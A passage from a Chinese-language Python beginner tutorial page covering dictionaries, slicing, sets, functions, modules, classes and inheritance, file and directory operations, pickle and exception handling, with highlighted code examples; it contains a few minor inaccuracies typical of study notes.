<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#len()	测量字典中，键值对的个数</span></span><br><span class="line">dict = &#123;<span class="string">"name"</span>:<span class="string">'zhangsan'</span>,<span class="string">'sex'</span>:<span class="string">'m'</span>&#125;</span><br><span class="line">print(len(dict))</span><br><span class="line"><span class="comment">#keys()	返回一个包含字典所有KEY的列表</span></span><br><span class="line">print(dict.keys())</span><br><span class="line"><span class="comment">#values()	返回一个包含字典所有value的列表</span></span><br><span class="line">print(dict.values())</span><br><span class="line"><span class="comment">#items()	返回一个包含所有（键，值）元祖的列表</span></span><br><span class="line">print(dict.items())</span><br><span class="line"><span class="comment">#has_key(key)	如果key在字典中，返回True，否则返回False	</span></span><br><span class="line">print(dict.has_key(<span class="string">'name'</span>))</span><br></pre></td></tr></table></figure>



<h2 id="下标和切片"><a href="#下标和切片" class="headerlink" title="下标和切片"></a>下标和切片</h2><p>列表、元组和字符串都是序列，序列的主要特点是成员检验(<code>in</code>or<code>not in</code>)和索引操作符。</p>
<ul>
<li>切片的语法：[起始:结束:步长]</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#例：</span></span><br><span class="line">shoplist = [<span class="string">'apple'</span>, <span class="string">'mango'</span>, <span class="string">'carrot'</span>, <span class="string">'banana'</span>]</span><br><span class="line">name = <span class="string">'swaroop'</span></span><br><span class="line"><span class="comment">#[开始:结束:步长]，包含开头不包含结尾，三个参数可选，默认步长为1，开头为0，结尾为-1，步长加符号表示逆序</span></span><br><span class="line">print(shoplist[<span class="number">0</span>])      <span class="comment">#第一个</span></span><br><span class="line">print(shoplist[<span class="number">1</span>])      <span class="comment">#第二个</span></span><br><span class="line">print(shoplist[<span class="number">2</span>])</span><br><span class="line">print(shoplist[<span class="number">3</span>])</span><br><span class="line">print(shoplist[<span class="number">-1</span>])     <span class="comment">#倒数第一个</span></span><br><span class="line">print(shoplist[<span class="number">-2</span>])     <span class="comment">#倒数第二个</span></span><br><span class="line">print(name[<span class="number">0</span>])          <span class="comment">#第一个字母</span></span><br><span class="line">print()</span><br><span class="line">print(shoplist[<span class="number">1</span>:<span class="number">3</span>])    <span class="comment">#第二个到第三个</span></span><br><span class="line">print(shoplist[<span class="number">2</span>:])     <span class="comment">#第三个到最后一个</span></span><br><span class="line">print(shoplist[<span class="number">1</span>:<span class="number">-1</span>])   <span class="comment">#第二个到倒数第一个</span></span><br><span class="line">print(shoplist[:])      <span class="comment">#所有</span></span><br><span class="line">print()</span><br><span class="line">print(name[<span class="number">1</span>:<span class="number">3</span>])        <span class="comment">#同shoplist，只是对象换成字符串</span></span><br><span class="line">print(name[<span class="number">2</span>:])</span><br><span class="line">print(name[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">print(name[:])</span><br><span class="line">print()</span><br><span class="line">print(name[::<span class="number">2</span>])		</span><br><span class="line">print(name[<span class="number">1</span>:<span class="number">5</span>:<span class="number">2</span>])		</span><br><span class="line">print(name[::<span class="number">-2</span>])		</span><br><span class="line">print(name[<span class="number">4</span>::<span class="number">-2</span>])</span><br></pre></td></tr></table></figure>

<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>集合是没有顺序的简单对象的聚集。当在聚集中一个对象的存在比其顺序或者出现的次数重要时使用集合。</p>
<p>使用集合，可以检查是否是成员，是否是另一个集合的子集，得到两个集合的交集等等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bri = set([<span class="string">'brazil'</span>, <span class="string">'russia'</span>, <span class="string">'india'</span>])        <span class="comment">#创建集合</span></span><br><span class="line">print(bri)                                      <span class="comment">#输出集合</span></span><br><span class="line">print(<span class="string">'india'</span> <span class="keyword">in</span> bri)                           <span class="comment">#判断元素是否在集合中</span></span><br><span class="line">print(<span class="string">'usa'</span> <span class="keyword">in</span> bri)</span><br><span class="line">bric = bri.copy()                               <span class="comment">#复制集合</span></span><br><span class="line">bric.add(<span class="string">'china'</span>)                               <span class="comment">#添加元素</span></span><br><span class="line">print(bric.issuperset(bri))                     <span class="comment">#判断bri是否为bric的子集</span></span><br><span class="line">bri.remove(<span class="string">'russia'</span>)                            <span class="comment">#删除元素</span></span><br><span class="line">print(bri.intersection(bric))                   <span class="comment">#输出交集</span></span><br></pre></td></tr></table></figure>

<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>当你创建一个对象并给它赋一个变量的时候，这个变量仅仅引用那个对象，而不是表示这个对象本身！即两个变量名指向的是同一个内存，如果你只是想要使用另一个变量名，两个名称都引用同一个对象，那么如果你不小心的话，可能会引来各种麻烦。</p>
<h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>int(x [,base ])</td>
<td>将x转换为一个整数</td>
</tr>
<tr>
<td>long(x [,base ])</td>
<td>将x转换为一个长整数</td>
</tr>
<tr>
<td>float(x )</td>
<td>将x转换到一个浮点数</td>
</tr>
<tr>
<td>complex(real [,imag ])</td>
<td>创建一个复数</td>
</tr>
<tr>
<td>str(x )</td>
<td>将对象 x 转换为字符串</td>
</tr>
<tr>
<td>repr(x )</td>
<td>将对象 x 转换为表达式字符串</td>
</tr>
<tr>
<td>eval(str )</td>
<td>用来计算在字符串中的有效Python表达式,并返回一个对象</td>
</tr>
<tr>
<td>tuple(s )</td>
<td>将序列 s 转换为一个元组</td>
</tr>
<tr>
<td>list(s )</td>
<td>将序列 s 转换为一个列表</td>
</tr>
<tr>
<td>chr(x )</td>
<td>将一个整数转换为一个字符</td>
</tr>
<tr>
<td>unichr(x )</td>
<td>将一个整数转换为Unicode字符</td>
</tr>
<tr>
<td>ord(x )</td>
<td>将一个字符转换为它的整数值</td>
</tr>
<tr>
<td>hex(x )</td>
<td>将一个整数转换为一个十六进制字符串</td>
</tr>
<tr>
<td>oct(x )</td>
<td>将一个整数转换为一个八进制字符串</td>
</tr>
</tbody></table>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h3 id="定义与调用"><a href="#定义与调用" class="headerlink" title="定义与调用"></a>定义与调用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定义</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printInfo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'打印123'</span>		<span class="comment">#函数的文档说明</span></span><br><span class="line">    print(<span class="string">'123'</span>)</span><br><span class="line"><span class="comment">#调用</span></span><br><span class="line">printInfo()</span><br><span class="line">help(test)	<span class="comment">#打印文档说明</span></span><br></pre></td></tr></table></figure>

<h3 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定义</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printInfo</span><span class="params">(a)</span>:</span>	<span class="comment">#a为参数</span></span><br><span class="line">    <span class="string">'打印123'</span></span><br><span class="line">    print(a)</span><br><span class="line"><span class="comment">#调用</span></span><br><span class="line">printInfo(<span class="string">'123'</span>)	<span class="comment">#传入参数的值</span></span><br><span class="line"><span class="comment">#缺省参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo2</span><span class="params">(name,age=<span class="number">35</span>)</span>:</span><span class="comment">#缺省参数使用等号给予默认值，带有默认值的参数要位于参数列表最后</span></span><br><span class="line">   <span class="comment"># 打印任何传入的字符串</span></span><br><span class="line">   print(<span class="string">"Name: "</span>,name)</span><br><span class="line">   print(<span class="string">"Age "</span>, age)</span><br><span class="line"><span class="comment">#不定长参数</span></span><br><span class="line"><span class="comment">#有时可能需要一个函数能处理比当初声明时更多的参数。这些参数叫做不定长参数，声明时不会命名。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(a, b, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="comment">#加了星号（*）的变量args会存放所有未命名的变量参数，args为元组；而加**的变量kwargs会存放命名参数，即形如key=value的参数， kwargs为字典。</span></span><br><span class="line">    print(<span class="string">"a ="</span>, a)</span><br><span class="line">	print(<span class="string">"b ="</span>, b)</span><br><span class="line">	print(<span class="string">"args ="</span>, args)</span><br><span class="line">	print(<span class="string">"kwargs: "</span>)</span><br><span class="line">	<span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">		print(key, <span class="string">"="</span>, value)</span><br><span class="line"> fun(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, m=<span class="number">6</span>, n=<span class="number">7</span>, p=<span class="number">8</span>)	<span class="comment">#调用</span></span><br><span class="line"><span class="comment">#参数也可通过名称赋值</span></span><br></pre></td></tr></table></figure>

<h3 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h3><p><code>return</code>：可返回单个值，也可返回多个值为元组</p>
<h3 id="函数的嵌套调用"><a href="#函数的嵌套调用" class="headerlink" title="函数的嵌套调用"></a>函数的嵌套调用</h3><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><h3 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h3><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> [arg1 [,arg2,.....argn]]:expression</span><br><span class="line">sum = <span class="keyword">lambda</span> arg1, arg2: arg1 + arg2</span><br></pre></td></tr></table></figure>

<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>模块可以从另外一个程序导入来使用其函数的功能。这也是我们使用 Python 标准库的方式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#例：</span></span><br><span class="line"><span class="keyword">import</span> sys   <span class="comment">#导入sys模块 </span></span><br><span class="line">                </span><br><span class="line">print(<span class="string">'The command line arguments are:'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sys.argv:</span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'\n\nThe PYTHONPATH is'</span>, sys.path, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><p>在python中，有两种导入模块的方式：</p>
<ol>
<li><code>import 模块名</code></li>
<li><code>from...import...</code></li>
</ol>
<p>一般说来，应该避免使用 from..import 而使用 import 语句，因为这样可以使你的程序更加易读，也可以避免名称的冲突。</p>
<p>导入后可使用<code>as</code>为导入的模块添加别名</p>
<h2 id="导入的原理"><a href="#导入的原理" class="headerlink" title="导入的原理"></a>导入的原理</h2><p>当 Python 执行import语句的时候，它会寻找要导入的模块。如果要导入内置模块，Python 知道在哪里找到它。</p>
<p>如果要导入的是未编译的模块，如用 Python 写的模块， Python 解释器会查找列在sys.path 变量中的路径。如果模块找到了，就会运行那个模块主体中的语句，模块就是可以利用的了。</p>
<p>初始化过程仅在我们第一次导入模块的时候进行。</p>
<h2 id="pyc文件"><a href="#pyc文件" class="headerlink" title=".pyc文件"></a>.pyc文件</h2><p>导入一个模块相对来说是一个比较费时的事情，所以 Python 做了一些技巧，以便使输入模块更加快一些。</p>
<p>一种方法是创建按字节编译的文件，这些文件以.pyc 作为扩展名。字节编译的文件与 Python 变换程序的中间状态有关。</p>
<p>当你在下次从别的程序输入这个模块的时候，.pyc 文件会快得多，因为一部分输入模块所需的处理已经完成了。另外，这些字节编译的文件也是与平台无关的。</p>
<p>这些.pyc 文件通常与.py 文件相同的方式在相同路径被创建。如果 Python 没有写入当前路径的权限，.pyc 文件就不会被创建。</p>
<h2 id="模块的-name"><a href="#模块的-name" class="headerlink" title="模块的__name__"></a>模块的__name__</h2><p>每个模块都有一个名称，在模块中可以通过语句来找出模块的名称。这在一个场合特别有用 —— 就如前面所提到的，当一个模块被第一次输入的时候，这个模块的主块将被运行。假如我们只想在程序本身被使用的时候运行主块，而在它被别的模块输入的时候不运行主块，我们该怎么做呢？这可以通过模块的 <strong>name</strong> 属性完成。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#每个 Python 模块都有它的 __name__，如果它是’__main__’，则说明这个模块被用户单独运行.</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'This program is being run by itself'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'I am being imported from another module'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$ python using_name.py</span><br><span class="line">This program is being run by itself</span><br><span class="line">$ python</span><br><span class="line">&gt;&gt;&gt; import using_name</span><br><span class="line">I am being imported from another module</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="模块的-all"><a href="#模块的-all" class="headerlink" title="模块的__all__"></a>模块的<code>__all__</code></h2><p>如果一个文件中有<code>__all__</code>变量，那么也就意味着这个变量中的元素，不会被from xxx import *时导入</p>
<h2 id="创建自己的模块"><a href="#创建自己的模块" class="headerlink" title="创建自己的模块"></a>创建自己的模块</h2><p>创建你自己的模块是十分简单的，你一直在这样做！每个 Python 程序就是一个模块。</p>
<h2 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir 函数"></a>dir 函数</h2><p>你可以使用内建的 dir 函数来列出模块定义的标识符。标识符有函数、类和变量。<br>当你为 dir() 提供一个模块名的时候，它返回模块定义的名称列表。如果不提供参数，它返回当前模块中定义的名称列表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在控制台使用(不是编辑器)</span></span><br><span class="line">dir()</span><br><span class="line">dir(sys)</span><br><span class="line">dir(<span class="keyword">print</span>)</span><br><span class="line">dir(str)</span><br></pre></td></tr></table></figure>

<h2 id="包"><a href="#包" class="headerlink" title="包"></a>包</h2><p>包是模块的文件夹，有一个特殊的<code>__init__.py</code>文件，用来表明这个文件夹是特殊的因为其包含有 Python 模块。包仅仅是为了方便层次化地组织模块。你会看到在标准库中看到许多这样的实例.</p>
<h2 id="模块的发布与安装"><a href="#模块的发布与安装" class="headerlink" title="模块的发布与安装"></a>模块的发布与安装</h2><h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><h2 id="对象的属性"><a href="#对象的属性" class="headerlink" title="对象的属性"></a>对象的属性</h2><p>如果在属性名前面加了2个下划线’__’，则表明该属性是私有属性，否则为公有属性</p>
<h2 id="对象的方法"><a href="#对象的方法" class="headerlink" title="对象的方法"></a>对象的方法</h2><h3 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h3><p>我们已经讨论了类/对象可以拥有像函数一样的方法，这些方法与函数的区别只是一个额外的 self 变量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="comment">#创建一个成员方法</span></span><br><span class="line">    <span class="comment">#这里我们看到了 self 的用法。注意 sayHi 方法没有任何参数，但仍然在函数定义时有self。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sayHi</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Hello, how are you?'</span>)</span><br><span class="line"></span><br><span class="line">p = Person()</span><br><span class="line">p.sayHi()</span><br></pre></td></tr></table></figure>

<h3 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h3><p>在python中方法名如果是<code>__xxxx__()</code>的，那么就有特殊的功能，因此叫做“魔法”方法。例如：当使用print输出对象的时候，只要自己定义了<code>__str__(self)</code>方法，那么就会打印从在这个方法中return的数据</p>
<ul>
<li>__init__ 方法</li>
</ul>
<p><code>__init__</code>方法在类的一个对象被建立时，马上运行。这个方法可以用来对你的对象做一些你希望的初始化。</p>
<ul>
<li>__new__方法</li>
</ul>
<p>必须要有返回值，返回实例化出来的实例，这点在自己实现<code>__new__</code>时要特别注意，可以return父类<code>__new__</code>出来的实例，或者直接是object的<code>__new__</code>出来的实例</p>
<h3 id="静态方法和类方法"><a href="#静态方法和类方法" class="headerlink" title="静态方法和类方法"></a>静态方法和类方法</h3><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#例：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SchoolMember</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name,age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        print(<span class="string">'(姓名:&#123;0&#125;)'</span>.format(self.name))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tell</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Name:"&#123;0&#125;" Age:"&#123;1&#125;"'</span>.format(self.name,self.age),end=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span><span class="params">(SchoolMember)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name,age,salary)</span>:</span></span><br><span class="line">        SchoolMember.__init__(self,name,age)</span><br><span class="line">        self.salary = salary</span><br><span class="line">        print(<span class="string">'(老师:&#123;0&#125;)'</span>.format(self.name))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tell</span><span class="params">(self)</span>:</span></span><br><span class="line">        SchoolMember.tell(self)</span><br><span class="line">        print(<span class="string">'Salary:"&#123;0:d&#125;"'</span>.format(self.salary))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(SchoolMember)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name,age,marks)</span>:</span></span><br><span class="line">        SchoolMember.__init__(self,name,age)</span><br><span class="line">        self.marks = marks</span><br><span class="line">        print(<span class="string">'(学生:&#123;0&#125;)'</span>.format(self.name))</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tell</span><span class="params">(self)</span>:</span></span><br><span class="line">        SchoolMember.tell(self)</span><br><span class="line">        print(<span class="string">'Marks:"&#123;0:d&#125;"'</span>.format(self.marks))</span><br><span class="line"></span><br><span class="line">t = Teacher(<span class="string">'Mrs.Shrividya'</span>,<span class="number">30</span>,<span class="number">30000</span>)</span><br><span class="line">s = Student(<span class="string">'Swaroop'</span>,<span class="number">25</span>,<span class="number">75</span>)</span><br><span class="line">print() <span class="comment">#输出一个空行</span></span><br><span class="line">members = [t,s]</span><br><span class="line"><span class="keyword">for</span> member <span class="keyword">in</span> members:</span><br><span class="line">    member.tell()</span><br></pre></td></tr></table></figure>

<p>重写：就是子类中，有一个和父类相同名字的方法，在子类中的方法会覆盖掉父类中同名的方法</p>
<h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><p>定义了一个创建对象的<code>接口</code>(可以理解为函数)，但由子类决定要实例化的类是哪一个，工厂方法模式让类的实例化推迟到子类，抽象的CarStore提供了一个创建对象的方法createCar，也叫作<code>工厂方法</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarStore</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="comment">#仅仅是定义了有这个方法，并没有实现，具体功能，这个需要在子类中实现</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createCar</span><span class="params">(self, typeName)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">order</span><span class="params">(self, typeName)</span>:</span></span><br><span class="line">        <span class="comment"># 让工厂根据类型，生产一辆汽车</span></span><br><span class="line">        self.car = self.createCar(typeName)</span><br><span class="line">        self.car.move()</span><br><span class="line">        self.car.stop()</span><br></pre></td></tr></table></figure>

<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>你可以创建一个 <code>file 类的对象</code>来打开文件，分别使用 file 类的<code>read</code>、<code>readline</code> 或 <code>write</code> 方法来恰当地读写文件。对文件的读写能力依赖于你在打开文件时指定的模式。最后，当你完成对文件的操作的时候，你调用<code>close 方法</code>来告诉 Python 我们完成了对文件的使用。</p>
<p>链接：<a href="http://www.runoob.com/python/file-methods.html" target="_blank" rel="noopener">文件操作</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">poem = <span class="string">'''</span></span><br><span class="line"><span class="string">Programming is fun</span></span><br><span class="line"><span class="string">When the work is done</span></span><br><span class="line"><span class="string">if you wanna make your work also fun:</span></span><br><span class="line"><span class="string">    use Python!</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#open()方法用于打开一个文件，并返回文件对象，如果该文件无法被打开，会抛出 OSError。</span></span><br><span class="line">f = open(<span class="string">'poem.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line"><span class="comment">#write()方法将字符串写入文件，返回的是写入的字符长度。</span></span><br><span class="line">f.write(poem)</span><br><span class="line"><span class="comment">#close()方法关闭文件。关闭后文件不能再进行读写操作。</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'poem.txt'</span>) <span class="comment">#第二个参数默认为’r‘</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#readline()方法读取整行，包括 "\n" 字符。</span></span><br><span class="line">    line = f.readline()</span><br><span class="line">    <span class="keyword">if</span> len(line) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#默认情况下，print() 函数将文本和自动生成的新行打印到屏幕。我们指定 end=”来制约新行的产生，因为从文件中读出的行已经用了换行符。</span></span><br><span class="line">    print(line, end=<span class="string">''</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>文件打开模式表：</p>
<table>
<thead>
<tr>
<th>访问模式</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td>
</tr>
<tr>
<td>w</td>
<td>打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td>a</td>
<td>打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td>rb</td>
<td>以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。</td>
</tr>
<tr>
<td>wb</td>
<td>以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td>ab</td>
<td>以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td>r+</td>
<td>打开一个文件用于读写。文件指针将会放在文件的开头。</td>
</tr>
<tr>
<td>w+</td>
<td>打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td>a+</td>
<td>打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td>
</tr>
<tr>
<td>rb+</td>
<td>以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。</td>
</tr>
<tr>
<td>wb+</td>
<td>以二进制格式打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td>ab+</td>
<td>以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td>
</tr>
</tbody></table>
<h2 id="pickle-模块"><a href="#pickle-模块" class="headerlink" title="pickle 模块"></a>pickle 模块</h2><p>Python 提供了一个叫做 pickle 的标准模块，使用该模块你可以将任意对象存储在文件中，之后你又可以将其完整地取出来。这被称为持久地存储对象。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">shoplistfile = <span class="string">'shoplist.data'</span></span><br><span class="line"></span><br><span class="line">shoplist = [<span class="string">'apple'</span>,<span class="string">'mango'</span>,<span class="string">'carrot'</span>]</span><br><span class="line"><span class="comment">#二进制模式打开一个 file 对象，然后调用 pickle 模块的 dump 函数，这个过程称为 pickling 。</span></span><br><span class="line">f = open(shoplistfile,<span class="string">'wb'</span>)</span><br><span class="line">pickle.dump(shoplist, f) </span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> shoplist </span><br><span class="line"></span><br><span class="line"><span class="comment">#用 pickle 模块的返回对象的 load 函数重新取回对象。这个过程称之为 unpickling 。</span></span><br><span class="line">f = open(shoplistfile,<span class="string">'rb'</span>)</span><br><span class="line">storedlist = pickle.load(f) </span><br><span class="line">print(storedlist)</span><br></pre></td></tr></table></figure>

<h2 id="文件的定位读写"><a href="#文件的定位读写" class="headerlink" title="文件的定位读写"></a>文件的定位读写</h2><p>在读写文件的过程中，如果想知道当前的位置，可以使用tell()来获取</p>
<p>如果在读写文件的过程中，需要从另外一个位置进行操作的话，可以使用seek()</p>
<p>seek(offset, from)有2个参数</p>
<ul>
<li>offset:偏移量</li>
<li>from:方向<ul>
<li>0:表示文件开头</li>
<li>1:表示当前位置</li>
<li>2:表示文件末尾</li>
</ul>
</li>
</ul>
<h2 id="文件的重命名、删除"><a href="#文件的重命名、删除" class="headerlink" title="文件的重命名、删除"></a>文件的重命名、删除</h2><p>os模块中的rename()可以完成对文件的重命名操作:rename(需要修改的文件名, 新的文件名)</p>
<p>os模块中的remove()可以完成对文件的删除操作:remove(待删除的文件名)</p>
<h2 id="文件夹的相关操作"><a href="#文件夹的相关操作" class="headerlink" title="文件夹的相关操作"></a>文件夹的相关操作</h2><p>创建文件夹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">    os.mkdir(<span class="string">"张三"</span>)</span><br></pre></td></tr></table></figure>

<p>获取当前目录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">    os.getcwd()</span><br></pre></td></tr></table></figure>

<p>改变默认目录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">    os.chdir(<span class="string">"../"</span>)</span><br></pre></td></tr></table></figure>

<p>获取目录列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">   os.listdir(<span class="string">"./"</span>)</span><br></pre></td></tr></table></figure>

<p>删除文件夹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">   os.rmdir(<span class="string">"张三"</span>)</span><br></pre></td></tr></table></figure>

<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><h2 id="错误与异常"><a href="#错误与异常" class="headerlink" title="错误与异常"></a>错误与异常</h2><p>错误是无法通过其他代码进行处理问题，如语法错误和逻辑错误，语法错误是单词或格式等写错，只能根据系统提示去修改相应的代码，逻辑错误是代码实现功能的逻辑有问题，系统不会报错，也是只能找到相应的代码进行修改</p>
<p>异常是程序执行过程中，出现的未知问题，这里语法和逻辑都是正确的，可以通过其他代码进行处理修复，如可以通过if判定语句来避免对年龄进行赋值时输入了字符而出现异常的情况，如使用捕捉异常可以避免除零异常等。</p>
<h2 id="异常处理-1"><a href="#异常处理-1" class="headerlink" title="异常处理"></a>异常处理</h2><p>我们可以使用 <code>try..except</code> 语句来处理异常。我们把运行的语句放在 try-块中，把错误处理语句放在 except-块中。</p>
<p>try except 语句还有一个可选的<code>else子句</code>，如果使用这个子句，那么必须放在所有的except子句之后。这个子句将在try子句没有发生任何异常的时候执行。</p>
<p>Python 使用<code>raise</code>语句抛出一个指定的异常。</p>
<p>链接：<a href="http://www.runoob.com/python3/python3-errors-execptions.html" target="_blank" rel="noopener">详细</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = open(<span class="string">'myfile.txt'</span>)</span><br><span class="line">    s = f.readline()</span><br><span class="line">    i = int(s.strip())</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> err:</span><br><span class="line">    print(<span class="string">"OS error: &#123;0&#125;"</span>.format(err))</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    print(<span class="string">"Could not convert data to an integer."</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"Unexpected error:"</span>, sys.exc_info()[<span class="number">0</span>])</span><br><span class="line">    <span 